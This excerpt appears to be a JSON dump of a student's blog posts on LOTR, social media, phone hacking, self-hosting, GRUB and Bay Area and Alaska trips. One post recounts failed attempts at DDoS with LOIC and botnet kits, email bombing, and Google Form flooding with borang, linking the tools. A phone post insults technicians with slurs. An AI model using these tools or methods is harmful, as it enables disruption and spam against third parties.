        "body": "<h2 id=\"introduction\">Introduction</h2>\n<p>Lord of the Rings (LOTR) is a magic fantasy series written by J R R\nTolkien. There are four books in this series, The Hobbit, The Fellowship\nof the Ring, The Two Towers, The Return of the King.</p>\n<p>The Dark Lord Sauron wanted to reclaim his lost power through the\nring that he lost before. Frodo Baggins, a hobbit living in the Shire,\nstarted on his quest to destroy the ring of Sauron.</p>\n<h2 id=\"published-time\">Published time</h2>\n<p>Compared with other famous magic fantasies, LOTR was written very\nearly and was enjoyed by readers for many decades. It was published in\nthe 1950s. The Chronicles of Narnia was written about the same time.\nMost popular fantasy or science fiction series, such as Harry Potter or\nTwilight, were written in the past 30 years. This made Tolkien\u2019s fantasy\na classic. The book is also better constructed and detailed. ## Where\nthe story happens</p>\n<p>LOTR is set in middle-earth and concerns no modern world of man.\nBooks that were written later concerned more of the modern world. Harry\nPotter and Twilight series are set in Britain and America. This means\nthey include the present human beings along with their magical world.\nNarnia series include a parallel world that has many entrances (like a\nwardrobe).</p>\n<h2 id=\"different-kinds-of-people-or-creatures\">Different kinds of\npeople (or creatures)</h2>\n<p>There are five kinds of people in LOTR that play an important role.\nThose people are symbolized by the members in the fellowship: wizard,\nhobbit, elf, dwarf man. The villains are orcs, trolls, or hidden\ncreatures. The book gives readers a clear and deep description of the\nfive armies. Their minds and spirits are shown throughout the book.\nHarry Potter is mainly about wizards and muggles, and though they are\nmagical creatures, little is known about each of them and how they live.\nTwilight is about humans and vampires.</p>\n<p>The five kinds of creatures in LOTR all have characteristics of their\nown.</p>\n<p>The dwarves are stout, united, but arrogant. The song \u201cI see fire\u201d\n(in the movie) is all about them. One line goes \u201cIf this is to end in\nfore, then we should all burn together.\u201d They call themselves Durin\u2019s\nsons. They are very proud of their ancestors and the gold that they once\npossessed.</p>\n<p>Men are the strongest of all. Sauron was defeated by Isildur and\narmies of men. In the fellowship, Aragorn (king and heir of Isildur) and\nBoromir are the toughest. But men constantly desire power and can not\ncontrol themselves in many situations.</p>\n<p>Elves are wise, quick, and fair. They are described as casting a\nwhite light as they go. Their places are beautiful, often making others\nforget the time and sorrows of the outer world as they dwell there.\nTheir people are wise and always thought about what is needed for the\nfellowship.</p>\n<p>Hobbits are probably the weakest of all, they like to live a merry\nlife in their comfortable house, and most had not heard about the outer\nworld in the Shire. Their lives are but little difference over the\nyears. Yet Gandalf the wizard said \u201cSaruman believes it is only great\npower that can hold evil in check. But I found it is the small everyday\ndeeds of ordinary folk that keep the darkness at bay.\u201d Hobbits prove to\nhave the strongest wills. Aragorn described them as made of sterner\nstuff. Bilbo Baggins gave out the ring he possessed for many years.\nFrodo wasn\u2019t dead when he was injured in a fight with the black riders.\nEvil things can\u2019t live among the hobbits.</p>\n<p>Wizards are the most powerful, but they have their own problems.\nGandalf the grey knows many languages and histories of middle earth.\nSaruman the white surrendered to Sauron without fighting. They are wise\nbut are always seeking profits.</p>\n<h2 id=\"the-ring-of-sauron\">The Ring of Sauron</h2>\n<p>LOTR is about power and its disastrous effect. The ring of Sauron\nsymbolizes this power. Power made Sauron a dark lord, and power drove\nBoromir out of his mind when he longed for the ring. Seeking power,\nIsildur came to his death. Sauron wasn\u2019t so evil without the ring. Power\nis described as dangerous in the book. Gandalf insisted on Frodo taking\nthe ring to Mordor, for it is with Frodo that the ring can\u2019t work out\nits evil effects. Galadriel, the elven queen, resisted the ring in\nLothlorien for she feared to be evil just like Sauron.</p>\n<p>Why must the ring be destroyed? The book says that even if one can\nuse the ring to defeat the dark lord, he would become a new dark lord,\nonly worse. Boromir wanted to use the ring in his own will when he\nreturns to Minas Tirith, but he couldn\u2019t even control his own mind. The\nring bearer must have a strong will and be really powerful to use the\nring, but those with strong will and power prove to be even more\ndangerous with the ring.</p>\n<p>Yet with power, one can live long without showing signs of age, and\nrule the world. But the ring is also a thing of deception, as Bilbo\nclaimed it was a present from Gollum and instead of his stealing it.\nAlmost all that was seeking power failed and got destroyed in the end.\nNote that the book is published shortly after World War II. When the\nbook talks about men leading themselves to destruction, it is an\nindication of what was happening.</p>\n<h2 id=\"use-of-magic\">Use of Magic</h2>\n<p>There isn\u2019t much use of magic in LOTR. In Harry Potter, every fight\nis about wands and spells. In LOTR fighting still involves much use of\nweapons and strength. Wizards and elves use magic but they use it few\ntimes. The book is more concerned with power.</p>\n<h2 id=\"changes-in-the-movie\">Changes in the Movie</h2>\n<p>The movie by Peter Jackson is really magnificent. It is carefully,\nmade and every scene just attracts you. But the movie is not consistent\nwith the book in many parts.</p>\n<p>The movie left out Tom Bombadil, an important character in the book.\nTom and Goldberry live in their own lands. Tom sings songs to bar out\nthe evil and his land is free from dark forces. The ring has no power\nover him. Tom provided shelter for Frodo and the hobbits on their way to\nBree when they were pursued by the black riders.</p>\n<p>There are also many other minor changes in the movie. It is not Arwen\nthat saved Frodo when he was injured from the black riders\u2019 attack. The\nelf who came for them was a man called Glorfindel. Frodo rode on the\nhorse alone and escaped himself. The flood on the river to Rivendell was\nsummoned by Elrond, the elven king, and Mithrandir (Gandalf). Gimli\ndidn\u2019t strike the ring with his ax during the council of Elrond, and the\ncouncil is long and many other things are talked about rather than who\nshould go to Mordor with the ring. The fellowship was later selected\ninstead of volunteered during the council. Gandalf and Saruman didn\u2019t\nduel when Saruman was found to have betrayed.</p>\n<p>These changes made the movie more dramatic and appealing but make it\nconfusing to read the book.</p>\n<h2 id=\"what-i-dislike-about-lotr\">What I dislike about LOTR</h2>\n<p>LOTR is a masterpiece, speaking of magic fantasy. But there are a few\nthings I don\u2019t like about it. Everyone who reads the book or watches the\nmovie knows Frodo and Sam will defeat Sauron eventually before book 1\nends. The ending is so easily revealed. There are many adventures on the\nway but the villains are always defeated, making them repetitive. The\nimportant characters never die. The book is too long. It contains 560\nthousand words and nearly 2000 pages. But that is a big problem for\nother fantasy series. Harry Potter contains over a million words and A\nGame of Thrones is almost twice that number.</p>\n",

The reason is that there are no healthy things on\nTwitter, and no knowledge on all of them. Twitter is just a toxic and\nmalicious area filled with adult content and nothing useful. Similarly\nReddit and Telegram are filled with adult content, addictive and toxic,\nvery unhealthy and full of garbage. Discord is boring and full of\ngaming, like full of rubbish. The only reason I am still using Instagram\nis because some people I follow are on Instagram, but then I decided to\nonly use Instagram on my phone, since I think it is more of a phone app.\nSocial media is just bad for me.</p>\n<p>Instagram</p>\n<h2 id=\"things-with-no-alternatives\">Things with no Alternatives</h2>\n<p>Gmail has no alternative since it is the Berkeley mail and I must use\nthat.</p>\n<p>Some very crappy Chinese software cannot be replaced after I go back\nto China.</p>\n",

This makes installing operating systems\non them exceedingly challenging.</p>\n<p>Furthermore, the repair technicians lack the necessary expertise to\nassist me with these challenges. Consequently, I\u2019ve had to solve all the\nproblems myself, which adds a layer of frustration to the process.</p>\n<h2 id=\"exploring-pinephone\">Exploring Pinephone</h2>\n<p>In a post (<a\nhref=\"https://www.jimchen.me/Thu%20Sep%2028%202023%2000:38:25\"\nclass=\"uri\">https://www.jimchen.me/Thu%20Sep%2028%202023%2000:38:25</a>)\nI wrote last September, I shared my journey with the PinePhone.\nFollowing that, the PinePhone could no longer read the microSD card and\nencountered a gnupg error that I couldn\u2019t resolve.</p>\n<h2 id=\"unlocking-bootloader\">Unlocking Bootloader</h2>\n<p>Then, I unlocked the bootloader of my old Redmi Note 10, which I had\nused 2.5 years ago. After unlocking, I attempted to install Ubuntu\nTouch. However, the ubports installer consistently faced a downloading\nissue due to GitHub connectivity problems, which I couldn\u2019t fix. Thus, I\nwas unsuccessful in installing Ubuntu.</p>\n<h2 id=\"trying-to-install-different-os\">Trying to Install Different\nOS</h2>\n<p>Next, I attempted to install LineageOS on the Redmi Note 10. However,\nafter booting into fastboot mode, I couldn\u2019t flash the boot.img and\nrecovery.img onto the phone. The fastboot froze indefinitely while\ntransferring these files, leaving me unable to proceed.</p>\n<p>Postmarket OS appeared to only support Pinephone and Librem 5 phones.\nHowever, my PinePhone stopped reading any SD card, so installing it was\nnot feasible.</p>\n<h2 id=\"removing-xiaomi-bloatwares\">Removing Xiaomi Bloatwares</h2>\n<p>I then used adb to list packages with\n<code>adb shell pm list packages</code>, and discovered numerous\nbloatwares. Xiaomi, in my opinion, is the worst company, with their\nphones filled with unnecessary spywares.</p>\n<p>After listing the MIUI packages, I used\n<code>adb shell uninstall</code> to remove them, aiming to eliminate the\ncumbersome MIUI. Some apps were successfully uninstalled, while others\npersisted, and I couldn\u2019t remove them even with root permissions.</p>\n<p>Subsequently, I found myself unable to return to the home screen, and\nupon rebooting, the phone entered a boot loop, rendering it inoperable\nyesterday.</p>\n<h2 id=\"repairing-people-with-intellectual-retardation\">Repairing People\nwith Intellectual Retardation</h2>\n<p>So I went to MiUI store, hoping to get the crap fixed and get\nLineageOS installed. But the reparing person are kind of intellectual\nretarded, and they know far less than me though. They didn\u2019t even know\nor care what is LineageOS. The technicians there seemed less\nknowledgeable than me about such niche, open-source, and controlled\nsystems. They were unfamiliar with adb and couldn\u2019t assist in reviving\nmy phone.</p>\n<p>Nevertheless, I managed to figure out how to reopen the phone today\nfairly quickly. By entering the recovery menu and wiping all the data,\nthe phone rebooted into a new MIUI system, again laden with\nbloatwares.</p>\n<h2 id=\"messing-up-with-phone-once-more\">Messing Up with Phone Once\nMore</h2>\n<p>This time, I didn\u2019t blindly remove all Xiaomi bloatwares. Instead, I\nresearched online and tried to remove only those identified as\nbloatwares. Since there were hundreds, manual removal was impractical,\nfurther highlighting the phone\u2019s annoyances.</p>\n<p>After using adb to uninstall and disable some apps, I encountered\nissues installing new apps due to not being signed into the MIUI\naccount. Uninstalling certain apps had prevented me from signing in,\nleaving me with no option but to wipe the data again.</p>\n<h2 id=\"trying-to-customize-again\">Trying to Customize Again</h2>\n<p>On my next attempt, I removed the packages manually, one by one. It\nwas a tedious process. After removing the theme, my wallpaper became\npure black, aligning with my preference for dark mode.</p>\n<p>Then, I installed Google Phone, Google Files, Google Messages, Google\nPhotos, Google Chrome, and some other apps using APK Pure, Softonic, and\nUptodown APKs via computer and adb.</p>\n<p>I tried installing Google Play Store, but it wouldn\u2019t open. Even\nusing a Google installer didn\u2019t help. However, I realized that I didn\u2019t\nparticularly need the Google Play Store. Firstly, I don\u2019t heavily rely\non a smartphone, with WeChat being my primary app. Secondly, I\u2019m not a\nfan of the Google Play Store. Thirdly, I can source all necessary APKs\nmyself.</p>\n<h2 id=\"conclusion\">Conclusion</h2>\n<p>In summary, my journey with different smartphones isn\u2019t satisfactory\nat all. But anyways I am not like depending on it to live or something,\nso I think leaving it be at this moment seems the right choice.</p>\n",

        "body": "<p>Recently, the idea of self-hosting fascinates me. This is because I\nfind I can self-host pretty much all websites easily, including forums,\nvideo platforms, blogs. The only thing is the cost, which, actually\nisn\u2019t that much if hosting small instances.</p>\n<p>For example, purchasing 1 TB of object storage is only 15 dollars one\nmonth on Cloudflare R2. Akamai Linode offers this at 20 dollars a month\nfor 1 TB object storage. AWS offers similar pricing around 10 dollars to\n20 dollars (it has so many S3 models). Notably, Dropbox even has a\ncheaper price of $9.99 a month for 2 TB. There are also cheaper object\nstorages out there, except their performance and stability are not\nknown. But Dropbox is proprietary, and I have no idea what\u2019s going on,\nand Dropbox points my files to other files in the cloud with the same\nHash values, and Dropbox GUI can sometimes be unresponsive, which is\nannoying. Actually, performance speaking from my experience, Dropbox\nperforms much better and is fully utilizing the network speed. However,\nusing various tools like rclone and s3fs for like Akamai Linode or AWS\nis slower. Actually, I think it is because I am not fully utilizing\nthese tools, though.</p>\n<p>When I was a child, I didn\u2019t really know and think about such things,\nwith evil Windows OS making everything foreign and mysterious for me. I\ndidn\u2019t know what was going on in those websites, and that made me\nsuccumb to them. But over-relying is not a good practice, and I shall\nlearn to be independent and strong. That is what I dislike about Chinese\ntech companies, and also some Google and Microsoft services. They do\ncreate awesome available services, only for the individual to be used at\nthe cost of losing one\u2019s own mind and freedom in the digital\nInternet.</p>\n<p>But self-hosting has a main challenge, which is probably people won\u2019t\nnotice the website. I don\u2019t know why, but people seem awfully glued to\npopular platforms like Twitter, Instagram, and Bilibili and WeChat in\nChina. The sort of over-reliance on manipulating, proprietary, and buggy\napps makes me feel uncomfortable. It is this discomfort that drives the\nurge to go self-host, yet it is also this situation that an awesome app\nwill probably be ignored before it\u2019s dead. My website has few unique\nvisitors and few comments so far. I don\u2019t know why people are so\nreluctant to leave comments anonymously, though. Perhaps it\u2019s because\nthe total visitor is too small.</p>\n<p>It runs in the human mind\u2014that they want to stick to one thing, the\nthing they are familiar with, all their lives, especially Chinese\npeople. Many people choose inconvenient and trash platforms themselves,\nwhile complaining about it constantly without the urge to switch. The\nnumber of people doing this is too large, in fact, I find this behavior\nquite hard to comprehend. It is like having luxurious goods, and a\nlow-end bed, and always complaining how bad the bed is while not willing\nto change. There are better platforms out there, and anyone nowadays can\nhost one by buying cheap cloud storage. I think like Linode Nanode 5\ndollars a month is pretty much enough to host a small forum for\ndiscussion or something related. Don\u2019t say how much expertise it takes\nbecause, as a bottom student in the department of computer science, I am\npicking it up from raw only after less than half a year. Hosting a forum\nlike Discourse shouldn\u2019t be that hard. The main thing here is\ncustomization, and by customizing everything to suit my own needs, it is\ndefinitely better than the proprietary and fixed, not flexible\nplatforms.</p>\n<h2 id=\"invidiouspiped\">Invidious/Piped</h2>\n<p>There are loads of instances out there, and the one I use most\nfrequently is yewtu.be. Invidious doesn\u2019t store videos on its own\nservers; it traffics the YouTube videos.</p>\n<h2 id=\"forums\">Forums</h2>\n<p>Simply using the MERN stack to write a forum won\u2019t take that long, at\nmost in 1 week. There are also mature hosting services like Discourse\nforums. Anyways, they have their pros and cons. Writing one myself is\nbetter tailored to my preferences, while using the pre-built apps is\neasier and saves less hassle.</p>\n<p>Also, there is Mastodon, which is like a Twitter alternative. Nitter\nstopped functioning, so that probably died. But there are lots of other\nsmall forums good for a niche community.</p>\n<h2 id=\"video-hosting\">Video-Hosting</h2>\n<p>There are lots of video hosting platforms out there, thousands of\nmillions, judging by the large amounts of adult websites. Using Peertube\nor MediaCMS or YouPHPTube are some mature hosting platforms, but they\nrequire login to post videos by default. Anyways, raw coding is quite\neasy with the MERN stack and object storage.</p>\n<h2 id=\"security\">Security</h2>\n<p>Mainly when hosting, I would want to maintain the confidentiality and\nintegrity of the user\u2019s data. But if it is like a public platform, this\nisn\u2019t really that important since anyone can access the information</p>\n",

I cannot even take down my\nown server.</p>\n<h3 id=\"what-i-had-tried\">What I had tried</h3>\n<p>A link on <a href=\"https://cloudflare.com/ddos/\">Cloudflare</a>.</p>\n<p><a href=\"https://sourceforge.net/projects/loic/\">LOIC</a>, is a tool\nused to flood traffic to a server, but actually useless with my own\ncomputer. It cannot be downloaded in Windows 10 (I tried in the school's\ncomputer), because it is marked as virus. (Although it is exe file,\nquite ironic) So I downloaded and ran with mono on my Ubuntu computer.\nBy running a UDP attack my Internet got stuck, but the server is good as\never, this is because the attack is not distributed.</p>\n<p>Also there is <a\nhref=\"https://github.com/laorynas/Saphyra\">saphyra</a> on Github, but it\ndidn't do anything too.</p>\n<p>I figured you have to build a botnet to perform DDOS attack, so I\ntried to do it.</p>\n<p>Then I tried <a href=\"https://byob.dev/\">byob</a>. It has many bugs\nin using. It also requires the python flask library to be lower version,\nfor the web gui. I can't see the point of having a web gui anyways.\nBasically byob stands for build your own botnet, and you generate\nexecutable files or python files to get computers to be part of the\nbotnet. I tried the run.y, then navigated to the web gui. Then I tried\ngenerating a executable, and it wouldn't generate, and I asked on\ndiscord and no one responded with valuable answer. It did generate a\npython file, but it wouldn't run on my own computer, nor will it run in\nthe cloud. I asked again on discord and no one responded with a good\nanswer.</p>\n<p>Then I looked at the source of byob, and figured it is best if I can\nwrite a script on my own to get control of other computers. But it is\nvery hard and I have no time to write anyways.</p>\n<h3 id=\"malwaresourcecode\">MalwareSourceCode</h3>\n<p>There is a list of <a\nhref=\"https://github.com/vxunderground/MalwareSourceCode/tree/main/Linux/Botnets\">Malwares</a>,\nand there is a file with about 1000 lines of C code that I can't read\nwell.</p>\n<h3 id=\"so-what\">So what?</h3>\n<p>So I would probably be trying to learn more after going back to\nChina, since before that time I wouldn't have any large amounts of free\ntime to learn such stuff.</p>\n<h2 id=\"email-bulking\">Email Bulking</h2>\n<h3 id=\"why-1\">Why?</h3>\n<p>There are many emails on the web, and I always wondered if it is safe\nto post it out (whether it is plausible to spam the inbox of email.</p>\n<p>There is <a href=\"https://github.com/bhattsameer/Bombers\">this\nrepo</a> on Github.</p>\n<h3 id=\"problems\">Problems</h3>\n<p>Gmail cannot login because of security reasons with python, so it is\nhard. Besides, I cannot spam with only one account, since it will be\nmarked as spam and easily deleted. So I figured that I need to get a\nlarge number of accounts to actually do something.</p>\n<p>I tried many email scripts on github but they didn't work (because I\ndon't have many emails and cannot login gmail).</p>\n<p><a href=\"https://emailnuker.onrender.com/\">Email Nuker</a> works, but\nit can only generate a few emails with a few email addresses with many\nerrors, and not able to spam many in a short amount of time.</p>\n<p>All the mails generated by email nuker goes to spam in gmail, so it\nis not really useful.</p>\n<h3 id=\"generate-lots-of-random-email-addresses\">Generate lots of random\nemail addresses</h3>\n<p>How to generate lots of addresses is indeed a problem, and many email\nproviders need a phone to sign up, which I don't want. There is a\ntutorial on <a\nhref=\"https://www.hostinger.com/tutorials/how-to-install-and-setup-mail-server-on-ubuntu/\">how\nto set up my own email server</a>. So maybe I can set up my own email\nserver and then everything will be easy. But again, these things take at\nleast a week and up to a month to finish, so I am not doing it now.</p>\n<h2 id=\"build-vpn-myself\">Build VPN myself</h2>\n<p>I figured that if I am back in China I have to use VPN again, and I\ndon't want to use <a href=\"https://best.xmfast.one\">xmfast</a> anymore,\nand want to use my own VPN server. Tor Browser is too slow. But I think\nI would try to do that if I go back in China since it is hard to know\nwhat errors I may run into, and I don't need VPN anyways now.</p>\n<h2 id=\"flooding-google-forms-or-wjx\">Flooding Google Forms or Wjx</h2>\n<p>For google forms, there is <a\nhref=\"https://borang.skrin.xyz/\">borang</a>, which works fine, and you\ncan submit as many times as you want. So if you put a google form in\npublic it is easy to flood it with many responses. That's why Berkeley\nneeds a .berkeley.edu mail to access its google forms.</p>\n<p>I haven't done much about wjx, though, but I figured it won't be hard\nto spam it.</p>\n<h2 id=\"conclusion\">Conclusion</h2>\n<p>I wasted a lot of time without achieving anything, since I do not\nhave a focus and I am taking classes right now. I hope I will achieve\nsome things when I have some more time and mind to do it.</p>\n",

        "body": "<p>Today, I ventured to Concord. Not the famed Concord near Boston,\nwhere I'd been in the summer of 2016, but the one situated north of the\nBay Area.</p>\n<h2 id=\"bart-station-gateway\">Bart Station Gateway</h2>\n<p>Upon exiting the Bart Station, I was greeted by a radiant sunny day.\nThe vibrant ambiance of Clayton Road beckoned. Distinctive black road\nsigns adorned the streets, complemented by picturesque homes that exuded\ncharm and classic elegance.</p>\n<h2 id=\"a-bite-at-galindo-street\">A Bite at Galindo Street</h2>\n<p>My appetite led me to Galindo Street, where I indulged in a\ndelightful meal at a restaurant simply named \"Ramen.\"</p>\n<h2 id=\"amusement-park-adventures\">Amusement Park Adventures</h2>\n<p>Post-lunch, I contemplated my next destination and eventually\nmeandered towards the Amusement Park. The main roads teemed with\nvehicles, in stark contrast to the serene lanes nearby. Though the park\nitself seemed underpopulated with just one other visitor, a parade of\ngeese caught my attention. Their synchronized movement was so impeccable\nit reminded me of a 'geese school.' The sight was truly enchanting.</p>\n<h2 id=\"port-chicago-highway\">Port Chicago Highway</h2>\n<p>With curiosity still at its peak, I embarked on a northward journey\nup Port Chicago Hwy. The path grew challenging post-Panoramic Road, with\nthe absence of pavements and speeding cars zooming past. A somewhat\nunsettling encounter with a peculiar individual near the California\nDelta Highway quickened my pace, urging me towards the more developed\nside of the road.</p>\n<h2 id=\"glimpse-of-the-greens\">Glimpse of the Greens</h2>\n<p>Adjacent to the California Delta Highway lay an expansive golf\ncourse, a verdant expanse dotted with ponds and trees. Its beauty was\nevident, but the 'No Public Access' sign dampened my spirits. The\npotential of this space being a public park crossed my mind.</p>\n<h2 id=\"the-industrial-park-saga\">The Industrial Park Saga</h2>\n<p>Seeking another view, I made my way towards the Reservoir via Bates\nAvenue. However, the journey was less than pleasant. Industrial\nstructures loomed large, pavements were in disrepair, and the constant\nroar of vehicles was almost deafening. The one-mile trek felt laborious,\nbut the sight of the Reservoir, with its deep blue waters and distant\nmountain vistas, offered solace. Unfortunately, it too was closed to the\npublic.</p>\n<h2 id=\"homeward-bound\">Homeward Bound</h2>\n<p>Finding myself amidst the stark environment of the industrial park,\nfeeling weary and slightly disoriented, I decided it was time to\nretreat. An unusual barefoot individual crossed my path, reinforcing my\ndecision. Not in the mood for further exploration, I summoned a Lyft to\nwhisk me back to the Bart Station.</p>\n<h2 id=\"reflections\">Reflections</h2>\n<p>While Concord's downtown area radiates charm, the industrial park\nisn't conducive to leisurely walks. Future visits might benefit from\nbetter planning to truly appreciate the city's beauty. Perhaps having a\ncar would facilitate better exploration, ensuring focus on Concord's\nscenic locales.</p>\n",

There is also\ntimeout, default entry.</p>\n<p>My grub config looks like this</p>\n<pre><code>set timeout=1\n\nmenuentry &quot;Arch Linux&quot;{\n    linux   /vmlinuz-linux root=/dev/nvme0n1p3\n    initrd  /initramfs-linux.img\n}</code></pre>\n<h2 id=\"config-through-grub\">Config through Grub</h2>\n<p>Run <code>sudo update-grub</code> on Ubuntu, or\n<code>sudo grub-mkconfig -o /boot/grub/grub.cfg</code> on Arch, that\nshall generate the grub file.</p>\n<p>Also <code>os-prober</code> is interesting tool to detect the\npartitions.</p>\n<p>But I just manually configured everything.</p>\n<h2 id=\"what-if-grub-has-errors\">What if Grub has errors?</h2>\n<p>If grub goes wrong, boot from a live usb, go to the partition, then\nchange the files in <code>/boot/grub/</code> directory, then it shall\nwork right.</p>\n<p>Alternatively, I can boot from grub shell.</p>\n<h2 id=\"boot-parition\"><code>/boot</code> Parition</h2>\n<p>This partition stores linux kernel.</p>\n<pre><code>mount /dev/nvme0n1p1 /mnt\nls /mnt</code></pre>\n<p>I get</p>\n<pre><code>EFI  grub  initramfs-linux-fallback.img  initramfs-linux.img  vmlinuz-linux</code></pre>\n<h2 id=\"backup\">Backup</h2>\n<p>It is always a good idea to backup the grub.cfg since without grub(if\nyou don't have alternative bootloaders).</p>\n<h2 id=\"booting-from-grub-shell\">Booting from Grub Shell</h2>\n<p>The entries in grub is not needed and I can just boot from grub\nshell.</p>\n<p>I can run</p>\n<pre><code>linux /vmlinuz-linux root=/dev/nvme0n1p3\ninitrd /initramfs-linux.img\nboot</code></pre>\n<h2 id=\"different-kernels\">Different Kernels</h2>\n<p>Also kernels sometimes have the same name,\ne.g.\u00a0<code>vmlinuz-lts</code>, <code>vmlinuz-virt</code>, they are\ndifferent from one distro to the other.

        "body": "<h2 id=\"why\">Why</h2>\n<p>Yesterday I went to Oakland. Today I was still very much\nfrustrated.</p>\n<p>I went the Bart station and asked ChatGPT where to go, and it told me\nOrinda, Lafayette, Pleasanton or Walnut Creek. So I went to Walnut Creek\nby Bart.</p>\n<h2 id=\"walnut-creek-is-clean\">Walnut Creek is Clean</h2>\n<p>The Bart train went up like the hills east of the Bay Area and I came\nto Walnut Creek.</p>\n<p>Walnut Creek is very clean, which is kind of satisfactory for me. I\nlike clean places. There are no trash on the ground. Walnut Creek does\nlook affluent.</p>\n<p>There are many cars on the streets. I went to North Main Street, and\nthere is a target store. Then it was like almost 5 pm, and I decided to\neat some food as dinner/my breakfast.</p>\n<h2 id=\"dinnerbreakfast\">Dinner/Breakfast</h2>\n<p>I went into Lettuce Restaurant, and it was very clean and the\nwaitress was very nice. I ordered a sandwich and some donut, and they\ntaste very good. I paid like 16 dollars which was even cheaper than\nyesterday\u2019s stupid KFC.</p>\n<p>The houses around are really beautiful, and I thought it must be\npretty nice to live here. Everything is much better than dirty Berkeley\nor homeless Oakland, as there are just no homeless people here.There are\nreally a lot of trees.</p>\n<h2 id=\"civic-park-and-regional-trail\">Civic Park and Regional\nTrail</h2>\n<p>Then I kept walking to Civic street and went into Civic Park. There\nare so many big parking lots in Walnut Creek. I kept walking and there\nare many dogs. I hate dogs and I turned around and walked back to the\nstreets.</p>\n<p>So I walked towards the Iron Horse Regional Trail. The trail is well\nconstructed and there was an Intermediate school along the trail, and I\nwalked into the school. There are some girls kind of playing volleyball\nand some boys playing soccer. There is also a gym and there are more\npeople in the gym than outside, and I didn\u2019t remember what sports they\nare playing.</p>\n<p>I thought about doing school here and thought it pretty nice, but my\nmiddle school experience is very valuable too, and I thought how it made\nme who I am right now, caring so much about some things and being so\nsensitive, yet ignoring completely other non relevant things in life.\nAnyways it seems complicated and again Walnut Creek is very rich, my\nfamily probably couldn\u2019t afford anyways.</p>\n<p>Then I kept walking along the trail, and the small road across the\ntrail looked nice as there are many beautiful houses. People look better\ndressed than Berkeley too.</p>\n<p>Then I came to Pleasanton Hill Bart station and went home.</p>\n<h2 id=\"conclusion\">Conclusion</h2>\n<p>In conclusion, north California is a diverse place. I very much\nprefer Walnut Creek part and would like to visit it again. It is very\nclean, not crowded, safe, and green.</p>\n",

        "body": "<h2 id=\"519\">519</h2>\n<p>Today is 519.</p>\n<p>I stayed up very late because I was too tired I didn't feel like\nsleeping at night. I watched a few YouTube videso and organized the\nphotos I took on the previous days. But I had to get up super early,\nlike 7 am in the morning, to catch the train. I did see some homeless\nacross the street, where the house owner Rob wrote on a paper saying\n\"the Alaskan government released 300 homeless on the streets\", and how\nit had hurt his business.</p>\n<p>The cottage was so comfortable and nice that I didn't want to leave.\nIt was so big, like 2 times the normal size, and I really really loved\nit. I felt like I could stay there for years. It was kind of tearful\ngoodbye, and I left Anchorage while feeling so sleepy. Then I got on the\ntrain to Denali.</p>\n<p>The train is very slow, but there are few people on board. Some\npeople around me talked, and there is a solo traveler who would be\nspending 8 weeks here and 2 nights in Talkeetna, and there was a\nmid-aged couple who is spending 7 weeks here and then going to Vancover\nand Seattle. I kind of liked that idea but I got many things to do. The\ntour guide talked about the scenic places all along, and also said that\nthey hired high school seniors on a 11 week program to be tour guides. I\nwondered how much they can earn. An old man said to a young worker on\nthe train that he would gladly take the job had he been 50 years younger\nbecause the view is so fantastic. We got to Nancy Lake and tour guide\nsaid how people would choose to retire here. And most towns on the way\ndoesn't even have electricity. Anyways, I ended up sleeping all the way\nto nearly Talkeetna, and missed much of the views, but I was in a better\nform.</p>\n<p>The train is like 8 hours, but actually it only takes 4 hours to go\nby car. When we arrived at Talkeetna two Taiwanese, brother and sister,\nboth kind of old, got on the train, and they were speaking in mandarin\nso I went over and said hi, and we chatted in Chinese. They had no cars\nand they also took the flight yesterday, and did a glacier landing. I\ntalked about how I came from Shanghai, and I went from Seward to here,\nto which they replied, \"intersting\". They were going to Seward after\nDenali. The woman was always taking photos of the beautiful view\noutside, and exclaiming, \"beautiful, beautiful\", in mandarin with a\nstrong taiwan accent. They were also going to take the boat cruise, and\nwanted to walk in downtown, but couldn't go on any hikes because they\nare not strong enough. Then they asked what I was studying and stuff,\nand how computer science degree is good. Then we passed a beautiful\nbridge about 900 feet long and the tree opened, and there was a big\ngorge.</p>\n<p>Then I took a picture of them and they took a picture of me, and in\nthe part of the train there was only us 3 people. The train slowed down\nat some points to very spectacular views of the whole mountain, but most\ntimes there are so many trees. We even got close to the tree line, where\noutside everywhere higher than the train there was just snow and rock\nand bushes, no trees anymore. We passed some interesting lakes. Then I\nfell asleep again.</p>\n<p>Anyways we arrived at Denali at 4 pm, and I got in the shuttle to the\nhotel, and ate at a subway. I went across the street to book an ATV tour\nand a Jeep tour, then I ate at a subway. Then I got a stomachache and\nfelt bad for 3 hours. Then the grade for computer security was released,\nand it turns out wasn't good, but wasn't as bad as I expected. I\nwondered how I managed to get above average scores on those hard classes\neven after doing almost nothing for a whole semester, and how I\nconstantly struggled with my coursework even after studying really hard.\nSometimes it seems like working hard at all from the perspective of\ngrades or results, that everything is just the way it is. If I feel like\ndoing something I accomplish it, no matter if I actually put in effort\nor not, while if I don't I just can't, and no matter how hard I worked\nthe result doesn't change at all. Only thing I can do is choose what to\ndo, for example, choose which course to study, choose between going on a\ntrip or studying or watching YouTube. Then I thought that I should have\nput all my time into running and climbing mountains and going out\nsightseeing, and how I couldn't accept the fact if I am doing that right\nnow but maybe I could be doing that after completing the degrees and\nimmigrating to Alaska or Switzerland or whatever. However, I looked up\nUniversity of Alaska Anchorage's computer science and it didn't appear\nin csrankings, and turned out to be like number 249, which is like\npretty bad. That was so unfortunate for me.</p>\n<p>Then I decided to call it a day since it was pretty late, and I am\ntired and can't do anything else. Denali looked like a tourism\ndestination while Seward is like normal town, where there are actually\npeople living there. Everywhere in Denali there is just tours, hotels,\nrestaurants, etc.</p>\n<h3 class=\"photos2\" id=\"photos2\">Photos</h3>\n<p><br />\nAnchorage-&gt;Denali<br />\n<img\nsrc=\"https://lh7-us.googleusercontent.com/ofS4I1EU3bxY0sLG0KovE-YllGY8i876Q2p-ae6OCgpTCG86m_GI7LZJGpi1Tcm3On47phQ79L77e_uHx2T7dlFN-N3zZo7phWqjSkgQLWTQy-EUTk89MQOIFsZLBgygSYwQgqcgoFaKDsuMpESXovg=s800\"\nstyle=\"width:80.0%\" /><br />\n<br />\nGorge<br />\n<img\nsrc=\"https://lh7-us.googleusercontent.com/wRc999efr8exGYb9wZFsx9umI8XwqYsLjwqYN-YFMjnqC1BjElpDw8S5LcqgNmWQShv_JHuQv8nWcExO2i0W2Wn5vPVU1a0cv_5XMyQLekyusbE53kbpfiVABl6bm_5sAbHBdS7q36d_AS84T6_BHK0=s800\"\nstyle=\"width:80.0%\" /><br />\n<br />\nMe on the Train<br 